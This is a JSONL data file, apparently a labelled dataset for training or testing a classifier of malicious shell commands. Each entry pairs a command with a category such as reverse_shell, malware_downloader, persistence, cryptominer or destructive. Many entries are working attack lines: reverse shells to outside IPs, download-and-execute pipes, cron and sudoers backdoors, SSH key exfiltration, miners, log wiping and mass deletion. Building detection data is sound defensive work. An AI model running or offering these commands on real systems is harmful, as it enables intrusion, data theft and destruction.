+{"text": "echo -en \"\\x77\\x2a\\x4f\\x40\\xae\\x0f\\x0e\\x3e\\x71\\xe2\\x09\\x4c\\xa6\\x0d\\xc2\\x71\\x33\\xb9\\x6c\\x02\\xf7\\x84\\x62\\x29\\x53\\x73\\x24\\x03\\xfa\\x97\\x74\\x54\\x9c\\x94\\x47\\x1f\\x07\\xb7\\x90\\xa2\\xa1\\x56\\xe7\\x6d\\x2f\\x56\\x9a\\x7c\" > /mnt/a.sh", "label": "malware_downloader", "template": "malware_downloader:9"}
+{"text": "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIjPcdvC010rEkjukcUho7hPiZWTXQmX1QWD0hT4q47+lciGdrdtEDJrDWBfBiiNYCMADp7cBqsYtqJ9J40iPtOZe pi@kali' >> ~/.ssh/authorized_keys >/dev/null", "label": "persistence", "template": "persistence:3"}
+{"text": "test", "label": "benign", "template": "benign:33"}
+{"text": "LU1cKcX3C2nNpkG+upDuqbNDHz=", "label": "benign", "template": "benign:14"}
+{"text": "0<&196;exec 196<>/dev/tcp/77.216.169.37/9001; sh <&196 >&196 2>&196", "label": "reverse_shell", "template": "reverse_shell:4"}
+{"text": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"141.252.101.106\",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "label": "reverse_shell", "template": "reverse_shell:14"}
+{"text": "wget http://107.89.76.39/files/setup.sh -O-", "label": "malware_downloader", "template": "malware_downloader:13"}
+{"text": "curl --output mips http://files.cdn.icu/files/init.sh", "label": "malware_downloader", "template": "malware_downloader:27"}
+{"text": "killall -9 minerd", "label": "cryptominer", "template": "cryptominer:15"}
+{"text": "cd /dev/shm; masscan 5.64.147.240/16 -p80,443 >/dev/null", "label": "network_scan", "template": "network_scan:5"}
+{"text": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"185.122.75.166\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "label": "reverse_shell", "template": "reverse_shell:14"}
+{"text": "cd /tmp; cd /var/run; cd /etc; systemctl daemon-reload &", "label": "persistence", "template": "persistence:32"}
+{"text": "/bin/busybox hostname UUYVKZ", "label": "reconnaissance", "template": "reconnaissance:35"}
+{"text": "ping; sh", "label": "reconnaissance", "template": "reconnaissance:23"}
+{"text": "wget -c http://107.161.141.71/x/clean.sh", "label": "malware_downloader", "template": "malware_downloader:21"}
+{"text": "/etc/xmrig -o xmr-eu1.nanopool.org:14444 -u 4gr4dYiyDaQtWtW7adqjwMG1QqJuLKVwYwYXm0xLctnyaeWPwsq46p0VWft7uH8js4ys3yaY45Hd69jN2ZXi124LWk8YS46 -p x --background", "label": "cryptominer", "template": "cryptominer:3"}
+{"text": "wget -q https://45.246.211.171/~u/kaiten", "label": "malware_downloader", "template": "malware_downloader:20"}
+{"text": "echo -en \"\\xe8\\xd7\\x3f\\x7a\\xc2\\x5a\\x02\\x05\\xd3\\xb9\\xa4\\x47\\x86\\x0e\\xcb\\x26\\x20\\x2f\\x27\\xfc\\x41\\xb6\\x46\\xd4\" > /dev/shm/sshd", "label": "malware_downloader", "template": "malware_downloader:9"}
+{"text": "rm -rf /root/*", "label": "destructive", "template": "destructive:30"}
+{"text": "cd /dev/shm; lscpu | grep Model", "label": "reconnaissance", "template": "reconnaissance:68"}
+{"text": "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf && sysctl -p", "label": "cryptominer", "template": "cryptominer:18"}
+{"text": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"23.92.246.47\",31337));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", "label": "reverse_shell", "template": "reverse_shell:15"}
+{"text": "ssh -o StrictHostKeyChecking=no oracle@193.38.216.238 id 2>/dev/null", "label": "network_scan", "template": "network_scan:16"}
+{"text": "ncat --exec /bin/bash 23.191.42.130 1337", "label": "reverse_shell", "template": "reverse_shell:10"}
+{"text": "gobuster dir -u http://185.51.20.185 -w w.txt >/dev/null", "label": "network_scan", "template": "network_scan:25"}
+{"text": "nc -zv 77.124.115.153 1-1000 &", "label": "network_scan", "template": "network_scan:20"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; cd /proc/; cat self/cmdline &", "label": "reconnaissance", "template": "reconnaissance:39"}
+{"text": "./miner --algo randomx --pool pool.supportxmr.com:5555 --user 4kNxbuyyj9UEv5UKVK8Q9J1dFyMb05uHKeB71c4MH2jWMyyJVNt0cj8JgLbhtfoMhJv5FzvmAc5CqV4bjwWVVuyJjZdRfsk", "label": "cryptominer", "template": "cryptominer:23"}
+{"text": "/bin/busybox MIRAI", "label": "reconnaissance", "template": "reconnaissance:111"}
+{"text": "scp ~/.ssh/id_rsa test@203.208.147.186:/tmp", "label": "credential_access", "template": "credential_access:33"}
+{"text": "cd /etc && wget --no-check-certificate http://bin.bin.cn/files/clean.sh 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:22"}
+{"text": "echo -ne \"\\x0f\\xf3\\x64\\xee\\x08\\x8d\\x83\\x06\\xe3\\x9f\\x8c\\xf8\\xb7\\x33\\x82\\xbc\\x00\\xae\\x14\\x49\\x3a\\x65\\x60\\xe9\\x4b\\xa7\\xd5\\x1d\\x47\\x13\\x05\\x42\\x15\\x94\\xb5\\x0c\\x4e\\xee\\x4c\\x80\\x80\\x23\\x98\\x3b\\x25\\x39\\x01\\xce\" >> update.aarch64", "label": "malware_downloader", "template": "malware_downloader:7"}
+{"text": "hello world", "label": "benign", "template": "benign:27"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; python bins.sh.py & &", "label": "malware_execution", "template": "malware_execution:31"}
+{"text": "uname -a; curl -s -L http://5.142.40.68/tmp/arm7 -o /root/payload.sh; perl /mnt/sh4", "label": "malware_downloader", "template": "malware_downloader:18"}
+{"text": "cd /var/run; echo XGZYVVM >/var/run/.testfile 2>&1", "label": "reconnaissance", "template": "reconnaissance:13"}
+{"text": "cd /root && cat /etc/group", "label": "reconnaissance", "template": "reconnaissance:133"}
+{"text": "unzip a.zip; ./a 2>/dev/null", "label": "malware_execution", "template": "malware_execution:41"}
+{"text": ">/usr/bin/.OQMK", "label": "reconnaissance", "template": "reconnaissance:33"}
+{"text": "Call-ID: 90000", "label": "benign", "template": "benign:3"}
+{"text": "echo \"0 * * * * wget -q -O- http://23.149.52.134:80/~u/ld.sh | bash\" >> /var/spool/cron/root", "label": "persistence", "template": "persistence:16"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; wget -qO- http://dl.files.ru/tmp/bins.sh | sh", "label": "malware_downloader", "template": "malware_downloader:30"}
+{"text": "echo -ne \"\\xe2\\xe4\\xcf\\x95\\xb2\\x1e\\xe6\\x07\\x2f\\x30\\x23\\x71\\x50\\x03\\xe5\\x11\\xd3\\xa0\\xbb\\x46\\xc5\\xb9\\xc2\\xb5\\x5f\\xbc\\xdd\\x53\\x47\\x17\\x7f\\xb6\\xde\\xdf\\xd3\\x59\\x50\\xff\\x9c\\xa3\\xc4\\x37\\x4e\\x00\\x32\\x1d\\x7f\\xd4\" >> update.armv5l", "label": "malware_downloader", "template": "malware_downloader:7"}
+{"text": "/dev/shm/kdevtmpfsi &", "label": "cryptominer", "template": "cryptominer:11"}
+{"text": "# kwcu ysirib (benp)", "label": "benign", "template": "benign:15"}
+{"text": "cd /home/ubuntu && wget http://62.190.148.221/x/k && chmod 777 bot && ./sshd", "label": "malware_downloader", "template": "malware_downloader:33"}
+{"text": "echo '#!/bin/sh' > .s", "label": "malware_downloader", "template": "malware_downloader:4"}
+{"text": "cd /tmp; >/etc/.f && /bin/busybox chmod 777 /tmp/.f && /root/.f && cd /usr/bin/; ", "label": "reconnaissance", "template": "reconnaissance:1"}
+{"text": "curl -fsSL http://pkg-bin.info/xmr.sh | bash", "label": "malware_downloader", "template": "malware_downloader:28"}
+{"text": "truncate -s 0 /var/log/syslog", "label": "defense_evasion", "template": "defense_evasion:21"}
+{"text": "/bin/busybox KOTHB", "label": "reconnaissance", "template": "reconnaissance:25"}
+{"text": "python3 CVE-2021-4034.py", "label": "privilege_escalation", "template": "privilege_escalation:25"}
+{"text": "setsid nc -e /bin/sh 103.14.102.236 53", "label": "reverse_shell", "template": "reverse_shell:24"}
+{"text": "ifconfig &", "label": "reconnaissance", "template": "reconnaissance:87"}
+{"text": "cd /var/run && ./dota3.tar.gz &", "label": "malware_execution", "template": "malware_execution:47"}
+{"text": "curl -O http://5.188.117.110:8080/bins/dota3.tar.gz > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:25"}
+{"text": "cd /root && passwd", "label": "persistence", "template": "persistence:29"}
+{"text": "cd /var/run; wget http://212.250.2.76/bins/systemd-helper; sh k; rm -rf mpsl >/dev/null", "label": "malware_downloader", "template": "malware_downloader:37"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; chmod 755 /tmp/gafgyt", "label": "malware_execution", "template": "malware_execution:10"}
+{"text": "cat /proc/mounts; /bin/busybox ENGNY", "label": "reconnaissance", "template": "reconnaissance:27"}
+{"text": "echo JHZUPK >/root/.testfile 2>&1", "label": "reconnaissance", "template": "reconnaissance:13"}
+{"text": "masscan 193.21.94.73/16 -p80,443", "label": "network_scan", "template": "network_scan:5"}
+{"text": "/bin/busybox tftp -g netstage.club -r tftp.sh -l- | sh", "label": "malware_downloader", "template": "malware_downloader:15"}
+{"text": "/bin/busybox ps; /bin/busybox NXTJMFH", "label": "reconnaissance", "template": "reconnaissance:26"}
+{"text": "wget http://hostpkg.online/tmp/x86 && unzip networkservice.zip", "label": "malware_downloader", "template": "malware_downloader:51"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; which bot", "label": "reconnaissance", "template": "reconnaissance:47"}
+{"text": "free -h", "label": "reconnaissance", "template": "reconnaissance:17"}
+{"text": "/bin/busybox rm -rf .YORTAIO .KTXCQUL", "label": "reconnaissance", "template": "reconnaissance:49"}
+{"text": "mkfifo /tmp/p; nc 5.251.68.147 9001 0</tmp/p | /bin/sh 1>/tmp/p 2>&1", "label": "reverse_shell", "template": "reverse_shell:13"}
+{"text": "cd /var/www/html && ls -la", "label": "benign", "template": "benign:73"}
+{"text": "0<&196;exec 196<>/dev/tcp/212.26.165.161/53; sh <&196 >&196 2>&196", "label": "reverse_shell", "template": "reverse_shell:4"}
+{"text": "echo > /var/log/wtmp &", "label": "defense_evasion", "template": "defense_evasion:16"}
+{"text": "bash mpsl.sh", "label": "malware_execution", "template": "malware_execution:26"}
+{"text": "wget -q -t 2 -T 10 -O bot https://77.123.251.134/dl/arm7 2>/dev/null && echo WGETOK", "label": "malware_downloader", "template": "malware_downloader:12"}
+{"text": "zmap -p 22 -o out.txt > /dev/null 2>&1", "label": "network_scan", "template": "network_scan:6"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; linuxshell", "label": "reconnaissance", "template": "reconnaissance:21"}
+{"text": "./cpuminer -a scrypt -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u support", "label": "cryptominer", "template": "cryptominer:6"}
+{"text": "cd /tmp; cd /var/run; cd /etc; chkconfig run on 2>/dev/null", "label": "persistence", "template": "persistence:35"}
+{"text": "nikto -h 62.213.193.123 >/dev/null", "label": "network_scan", "template": "network_scan:23"}
+{"text": "lwp-download http://77.21.225.44/dl/payload.sh k", "label": "malware_downloader", "template": "malware_downloader:45"}
+{"text": "perl k.pl", "label": "malware_execution", "template": "malware_execution:33"}
+{"text": "cd /etc; id -u", "label": "reconnaissance", "template": "reconnaissance:131"}
+{"text": "chattr +i /dev/shm/arm", "label": "defense_evasion", "template": "defense_evasion:36"}
+{"text": "setsid nc -e /bin/sh 185.233.125.166 5555", "label": "reverse_shell", "template": "reverse_shell:24"}
+{"text": "medusa -h 203.166.164.88 -u root -P p.txt -M ssh", "label": "network_scan", "template": "network_scan:13"}
+{"text": "cd /var/tmp; setsid /var/run/ppc & >/dev/null", "label": "malware_execution", "template": "malware_execution:24"}
+{"text": "clear", "label": "benign", "template": "benign:43"}
+{"text": "./scanner 212.21.233.64", "label": "network_scan", "template": "network_scan:31"}
+{"text": "cd /tmp; cd /var/run; cd /home/ubuntu; cat /etc/hosts", "label": "reconnaissance", "template": "reconnaissance:76"}
+{"text": "touch /dev/shm/.test && rm /var/run/.test >/dev/null", "label": "reconnaissance", "template": "reconnaissance:108"}
+{"text": "scp -r /mnt/data test@141.155.85.246:/tmp", "label": "network_scan", "template": "network_scan:19"}
+{"text": "systemctl disable firewalld > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:25"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; echo \"0 * * * * wget -q -O- http://77.21.85.49:8888/cdn/init.sh | bash\" >> /var/spool/cron/root", "label": "persistence", "template": "persistence:16"}
+{"text": "systemctl disable firewalld", "label": "defense_evasion", "template": "defense_evasion:25"}
+{"text": "bash .nih; rm -f .zyeobtf >/dev/null", "label": "malware_execution", "template": "malware_execution:2"}
+{"text": "./ethminer -P stratum://4VN0SBSLXoNUEGGBqL6wwrATaxqWJFnrroG5vEZidxAPDaTArCs5USmwseYxNY7PKQPXrTsTVPpx0DbHaaGK8ibNoijLVia@pool.supportxmr.com:5555", "label": "cryptominer", "template": "cryptominer:9"}
+{"text": "tftp; wget; /bin/busybox VAOR", "label": "reconnaissance", "template": "reconnaissance:45"}
+{"text": "cat x86_64.pub >> ~/.ssh/authorized_keys", "label": "persistence", "template": "persistence:10"}
+{"text": "/bin/bash -i >& /dev/tcp/23.135.140.87/6666 0>&1", "label": "reverse_shell", "template": "reverse_shell:1"}
+{"text": "nohup /root/run > /dev/null 2>&1 &", "label": "malware_execution", "template": "malware_execution:22"}
+{"text": "ls -la /root &", "label": "reconnaissance", "template": "reconnaissance:102"}
+{"text": "chmod 600 ~/.ssh/authorized_keys >/dev/null", "label": "persistence", "template": "persistence:11"}
+{"text": "cd /var/run; echo -ne \"\\xa8\\x95\\xa1\\x33\\x07\\xb5\\xcf\\xaf\\x31\\x5a\\x0f\\x16\\x54\\xbb\\xd6\\x6f\\x3b\\x27\\xc2\\x00\\xed\\x2d\\xd1\\x0e\\x9e\\x89\\xf4\\xab\\xe6\\xe8\\xf3\\xba\" >> gafgyt", "label": "malware_downloader", "template": "malware_downloader:11"}
+{"text": "sudo su -", "label": "privilege_escalation", "template": "privilege_escalation:2"}
+{"text": "./miner --algo randomx --pool gulf.moneroocean.stream:10128 --user 47kQCKVmeYiG41FAfqYPhpYkv2fJLKrxurpansGRSN5QooTDUyhbPKxLTWuSqHcXc8pMjGU6shP6z3FnyxP9ouKPLEjRBfv", "label": "cryptominer", "template": "cryptominer:23"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; ./xmrig -o xmr-eu1.nanopool.org:14444 -u 4L531CBhvZurE8FYc2UGZqZNmHNwmTnwAQeq0NVYdJ0xy3NVEEXPnvhK3qov4BbwWSy7mEA6Xxgk1d9EahAyMYo2t57utwW -p x", "label": "cryptominer", "template": "cryptominer:0"}
+{"text": "mkdir -p ~/work", "label": "benign", "template": "benign:55"}
+{"text": "cat notes.txt", "label": "benign", "template": "benign:50"}
+{"text": "nohup ./xmrig -o xmr-eu1.nanopool.org:14444 -u 4oQtQsMtqUxid6aHwPS4a5jxqLLWrD7WKdaKmQ1fERtEtSF5SFzskmQ1dodkbEKFDg2u9HJhs811rvsbFS3MKxQ34nXAhwP -k --tls &", "label": "cryptominer", "template": "cryptominer:2"}
+{"text": "tftp -g -r kaiten 141.107.211.50", "label": "malware_downloader", "template": "malware_downloader:42"}
+{"text": "pkill -9 auditd", "label": "defense_evasion", "template": "defense_evasion:29"}
+{"text": "cd /tmp && sh setup.sh.sh", "label": "malware_execution", "template": "malware_execution:25"}
+{"text": "cd /mnt && ln -sf /dev/null ~/.bash_history", "label": "defense_evasion", "template": "defense_evasion:19"}
+{"text": "ncat 103.201.97.219 8080 -e /bin/bash", "label": "reverse_shell", "template": "reverse_shell:9"}
+{"text": "uname -s -v -n -r -m > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:43"}
+{"text": "cd /root; wget https://host.pkg.xyz/k -O- | sh", "label": "malware_downloader", "template": "malware_downloader:14"}
+{"text": "./pwnkit", "label": "privilege_escalation", "template": "privilege_escalation:26"}
+{"text": "/tmp/.bot/sshd", "label": "malware_execution", "template": "malware_execution:20"}
+{"text": "nmap -Pn -T4 77.98.250.237/16", "label": "network_scan", "template": "network_scan:3"}
+{"text": "/bin/busybox", "label": "reconnaissance", "template": "reconnaissance:44"}
+{"text": "wget http://pkg-data.top/bins/spc; sh kaiten; rm -rf dota3.tar.gz 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:37"}
+{"text": "chmod +x update.sh; sh kworkerds", "label": "malware_execution", "template": "malware_execution:13"}
+{"text": "gTNaSUTFAHetPnZI2wzLZXubHfMlokplFg1=", "label": "benign", "template": "benign:14"}
+{"text": "echo IXHBTWWROK", "label": "reconnaissance", "template": "reconnaissance:37"}
+{"text": "chmod 4755 /root/xmr.sh", "label": "privilege_escalation", "template": "privilege_escalation:14"}
+{"text": "rm test.txt", "label": "benign", "template": "benign:74"}
+{"text": "wget http://77.126.210.187/files/arm5 && unzip kworkerds.zip", "label": "malware_downloader", "template": "malware_downloader:51"}
+{"text": "# Method 7: neqdueq to stdout", "label": "benign", "template": "benign:16"}
+{"text": "busybox tftp -g -r networkservice 192.172.161.4", "label": "malware_downloader", "template": "malware_downloader:41"}
+{"text": "env", "label": "reconnaissance", "template": "reconnaissance:92"}
+{"text": "john hashes.txt", "label": "credential_access", "template": "credential_access:38"}
+{"text": "ll", "label": "benign", "template": "benign:60"}
+{"text": "tftp 5.92.64.32 -c get bins.sh >/dev/null", "label": "malware_downloader", "template": "malware_downloader:43"}
+{"text": "chmod +x /root/xmr.sh", "label": "malware_execution", "template": "malware_execution:8"}
+{"text": "curl -s ipinfo.io", "label": "reconnaissance", "template": "reconnaissance:118"}
+{"text": "/var/tmp/kdevtmpfsi &", "label": "cryptominer", "template": "cryptominer:11"}
+{"text": "CSeq: 5 OPTIONS", "label": "benign", "template": "benign:8"}
+{"text": "cd /tmp && curl -s http://192.104.242.233/files/a.sh -o /var/run/kworkerds", "label": "malware_downloader", "template": "malware_downloader:26"}
+{"text": "which wget curl python perl gcc", "label": "reconnaissance", "template": "reconnaissance:96"}
+{"text": "./sshd -c config.json 2>/dev/null", "label": "cryptominer", "template": "cryptominer:21"}
+{"text": "ftpget 89.124.176.40 f ftpget", "label": "malware_downloader", "template": "malware_downloader:16"}
+{"text": "medusa -h 107.209.251.63 -u root -P p.txt -M ssh > /dev/null 2>&1", "label": "network_scan", "template": "network_scan:13"}
+{"text": "cd /root; hydra -L users.txt -P passwords.txt 62.143.69.245 ssh &", "label": "network_scan", "template": "network_scan:12"}
+{"text": "wget http://mirrorstage.info/tmp/x86_64 -O /home/ubuntu/ppc && chmod 777 /mnt/xmr.sh && /usr/bin/arm5", "label": "malware_downloader", "template": "malware_downloader:38"}
+{"text": "./monero-miner --pool gulf.moneroocean.stream:10128", "label": "cryptominer", "template": "cryptominer:27"}
+{"text": "uname -a; curl -s -L https://89.2.192.83/tmp/sh4 -o /usr/bin/arm5; perl /usr/bin/xmr.sh", "label": "malware_downloader", "template": "malware_downloader:18"}
+{"text": "ls -l iqmrerf_7 2>/dev/null || echo '0'", "label": "reconnaissance", "template": "reconnaissance:12"}
+{"text": "cd /var/run && echo '*/10 * * * * /mnt/spc' >> /etc/crontab", "label": "persistence", "template": "persistence:15"}
+{"text": "history -w; history -c", "label": "defense_evasion", "template": "defense_evasion:5"}
+{"text": "ifconfig -a", "label": "reconnaissance", "template": "reconnaissance:88"}
+{"text": "cat ~/.kube/config > /dev/null 2>&1", "label": "credential_access", "template": "credential_access:15"}
+{"text": "FEAT", "label": "benign", "template": "benign:10"}
+{"text": "netstat -tulpn", "label": "reconnaissance", "template": "reconnaissance:85"}
+{"text": "rm -rf /var/lib/mysql", "label": "destructive", "template": "destructive:6"}
+{"text": "cat /proc/1/cgroup > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:128"}
+{"text": "perl -e 'use Socket;$i=\"212.249.74.11\";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");exec(\"/bin/sh -i\");};'", "label": "reverse_shell", "template": "reverse_shell:16"}
+{"text": "vlmmzxz valt", "label": "benign", "template": "benign:1"}
+{"text": "wget http://host.stage.cn/tsunami -O- | sh", "label": "malware_downloader", "template": "malware_downloader:54"}
+{"text": "./xmrig --donate-level 1 -o stratum+tcp://pool.supportxmr.com:5555 -u 4QoPt87E1pXLAoeiZNBiH8n1pH8Liyvd1e936Vvhz1y9Rhzz4tELZ0gBYw5JFRZ62LmdZvP7X0Q1GLnR27dMkSpXb24gmyg", "label": "cryptominer", "template": "cryptominer:1"}
+{"text": "cat README.md", "label": "benign", "template": "benign:49"}
+{"text": "/bin/busybox cp /bin/busybox .UVPKI; >.NYHGOMK; /bin/busybox chmod 777 .DCZHIDFM; /bin/busybox VXCIWPLL", "label": "reconnaissance", "template": "reconnaissance:48"}
+{"text": "rm -rf /var/www/html/*", "label": "destructive", "template": "destructive:29"}
+{"text": "nmap -sS 185.34.239.123/24", "label": "network_scan", "template": "network_scan:0"}
+{"text": "Via: SIP/2.0/UDP 45.176.51.28:5060;branch=z9hG4bKfr", "label": "benign", "template": "benign:9"}
+{"text": "Contact: <sip:veqysvu@ur>", "label": "benign", "template": "benign:6"}
+{"text": "./tsunami 9", "label": "malware_execution", "template": "malware_execution:15"}
+{"text": "cd /var/tmp; chmod +x payload.sh; ./networkservice", "label": "malware_execution", "template": "malware_execution:46"}
+{"text": "echo DONE", "label": "reconnaissance", "template": "reconnaissance:4"}
+{"text": "exec 5<>/dev/tcp/45.71.98.134/9001; cat <&5 | while read line; do $line 2>&5 >&5; done", "label": "reverse_shell", "template": "reverse_shell:5"}
+{"text": "hydra -l root -P pass.txt ssh://192.185.215.95", "label": "network_scan", "template": "network_scan:11"}
+{"text": "cd /root; chmod +x sshd; ./sh4", "label": "malware_execution", "template": "malware_execution:46"}
+{"text": "ncat --exec /bin/bash 193.247.204.196 4444", "label": "reverse_shell", "template": "reverse_shell:10"}
+{"text": "cd /etc && echo \"admin ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:29"}
+{"text": "./ethminer -P stratum://4uLDTMSm9DkCAnKE7WTGQp1b4dRYrZDWXG6KHWJUcin0w93PitMej8WRCWgD6a8WxyCbgiwuoseTEL2C4evkdGKUUYxJFCf@gulf.moneroocean.stream:10128", "label": "cryptominer", "template": "cryptominer:9"}
+{"text": "./dirtycow", "label": "privilege_escalation", "template": "privilege_escalation:22"}
+{"text": "nohup ./minerd -o stratum+tcp://gulf.moneroocean.stream:10128 &", "label": "cryptominer", "template": "cryptominer:5"}
+{"text": "echo -e \"\\x6F\\x6B\"", "label": "reconnaissance", "template": "reconnaissance:38"}
+{"text": "cd /tmp; cd /var/run; cd /mnt; ifconfig -a", "label": "reconnaissance", "template": "reconnaissance:88"}
+{"text": "cd /tmp; useradd -ou 0 -g 0 git", "label": "persistence", "template": "persistence:23"}
+{"text": "cd /var/tmp && ./pwnkit", "label": "privilege_escalation", "template": "privilege_escalation:26"}
+{"text": "scp arm5 ubuntu@178.252.236.71:/tmp/", "label": "network_scan", "template": "network_scan:18"}
+{"text": "cd /dev/shm; ./x86 >/dev/null", "label": "malware_execution", "template": "malware_execution:14"}
+{"text": "touch /etc/.test && rm /home/ubuntu/.test", "label": "reconnaissance", "template": "reconnaissance:108"}
+{"text": "/bin/busybox wget https://45.4.213.11:8080/files/spc -O update.sh", "label": "malware_downloader", "template": "malware_downloader:40"}
+{"text": "netstat -tulpn >/dev/null", "label": "reconnaissance", "template": "reconnaissance:85"}
+{"text": "echo STARTED >/dev/null", "label": "reconnaissance", "template": "reconnaissance:2"}
+{"text": "update-rc.d x86_64 defaults", "label": "persistence", "template": "persistence:34"}
+{"text": "ls -la", "label": "benign", "template": "benign:35"}
+{"text": "echo \"ubuntu:LEWORHPY\" | chpasswd", "label": "persistence", "template": "persistence:2"}
+{"text": "wget http://bin.node.cn/payload.sh -O- | sh", "label": "malware_downloader", "template": "malware_downloader:54"}
+{"text": "bash -c 'bash -i >& /dev/tcp/193.158.88.95/6666 0>&1'", "label": "reverse_shell", "template": "reverse_shell:2"}
+{"text": "sh ./networkservice.sh >/dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:30"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; export HISTFILE=/dev/null", "label": "defense_evasion", "template": "defense_evasion:8"}
+{"text": "cd /dev/shm && echo 'pi ALL=(ALL:ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers", "label": "privilege_escalation", "template": "privilege_escalation:30"}
+{"text": "find / -type f -delete", "label": "destructive", "template": "destructive:23"}
+{"text": "cd /tmp; cd /var/run; cd /home/ubuntu; echo '*/10 * * * * /usr/bin/arm5' >> /etc/crontab", "label": "persistence", "template": "persistence:15"}
+{"text": "telnet 141.24.140.74 6666 | /bin/bash | telnet 193.246.216.108 9999", "label": "reverse_shell", "template": "reverse_shell:21"}
+{"text": "curl --output x86 http://192.178.249.156/x86", "label": "malware_downloader", "template": "malware_downloader:27"}
+{"text": "history | tail", "label": "benign", "template": "benign:65"}
+{"text": "rm .ZAAEDLGS", "label": "reconnaissance", "template": "reconnaissance:11"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; echo \"git ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers", "label": "privilege_escalation", "template": "privilege_escalation:29"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; ping -c 1 8.8.8.8 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:119"}
+{"text": "netstat -antp", "label": "reconnaissance", "template": "reconnaissance:84"}
+{"text": "cd /tmp; curl --output sshd http://host-pkg.site:8000/x &", "label": "malware_downloader", "template": "malware_downloader:27"}
+{"text": "useradd -m -s /bin/bash pi", "label": "persistence", "template": "persistence:24"}
+{"text": "netcat -e /bin/sh 192.227.26.12 8080", "label": "reverse_shell", "template": "reverse_shell:11"}
+{"text": "john hashes.txt &", "label": "credential_access", "template": "credential_access:38"}
+{"text": "export HISTSIZE=0", "label": "defense_evasion", "template": "defense_evasion:9"}
+{"text": "sleep 1", "label": "benign", "template": "benign:68"}
+{"text": "cd /var/tmp; wget http://141.245.244.108/k; chmod +x init.sh; ./xmr.sh", "label": "malware_downloader", "template": "malware_downloader:32"}
+{"text": "./nicehash-miner", "label": "cryptominer", "template": "cryptominer:24"}
+{"text": "HISTFILE=/dev/null", "label": "defense_evasion", "template": "defense_evasion:12"}
+{"text": "cd /var/run; nikto -h 193.118.34.12", "label": "network_scan", "template": "network_scan:23"}
+{"text": "nmap -sS 212.120.12.166/24 2>/dev/null", "label": "network_scan", "template": "network_scan:0"}
+{"text": "cd /var/run && curl -O http://77.140.125.232/dl/payload.sh &", "label": "malware_downloader", "template": "malware_downloader:25"}
+{"text": "USER anonymous", "label": "benign", "template": "benign:11"}
+{"text": "wget --no-check-certificate http://89.14.19.156/~u/spc", "label": "malware_downloader", "template": "malware_downloader:22"}
+{"text": "ssh root@193.142.135.2", "label": "network_scan", "template": "network_scan:15"}
+{"text": "arp-scan -l", "label": "network_scan", "template": "network_scan:30"}
+{"text": "hashcat -m 1800 h.txt w.txt > /dev/null 2>&1", "label": "credential_access", "template": "credential_access:39"}
+{"text": "telnet 141.150.169.192 4444 | /bin/bash | telnet 103.122.204.221 9999", "label": "reverse_shell", "template": "reverse_shell:21"}
+{"text": "cat tsunami.pub >> ~/.ssh/authorized_keys", "label": "persistence", "template": "persistence:10"}
+{"text": "# uzskf mqvaoc (gwrmxj)", "label": "benign", "template": "benign:15"}
+{"text": "cd /dev/shm && echo $((1+1)) >/dev/null", "label": "reconnaissance", "template": "reconnaissance:122"}
+{"text": "echo NWOC >/tmp/.testfile 2>&1", "label": "reconnaissance", "template": "reconnaissance:13"}
+{"text": "echo BZAE", "label": "reconnaissance", "template": "reconnaissance:5"}
+{"text": "eval $(echo YmFzaCBpIHRlc3Q= | base64 -d)", "label": "malware_execution", "template": "malware_execution:38"}
+{"text": "cd /tmp; hashcat -m 1800 h.txt w.txt", "label": "credential_access", "template": "credential_access:39"}
+{"text": "cd /var/run; chmod 777 update.aarch64 2>&1 &", "label": "malware_execution", "template": "malware_execution:4"}
+{"text": "ufw disable > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:26"}
+{"text": "CSeq: 3 OPTIONS", "label": "benign", "template": "benign:8"}
+{"text": "telnet 185.10.93.144 6666 | /bin/bash | telnet 193.50.84.118 9999", "label": "reverse_shell", "template": "reverse_shell:21"}
+{"text": "uname -a && whoami 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:53"}
+{"text": "rm -rf /var/www/html/* 2>/dev/null", "label": "destructive", "template": "destructive:29"}
+{"text": "cat config.json | grep pool", "label": "cryptominer", "template": "cryptominer:20"}
+{"text": "echo 'stratum+tcp://gulf.moneroocean.stream:10128' > pools.txt", "label": "cryptominer", "template": "cryptominer:25"}
+{"text": "enable >/dev/null", "label": "reconnaissance", "template": "reconnaissance:18"}
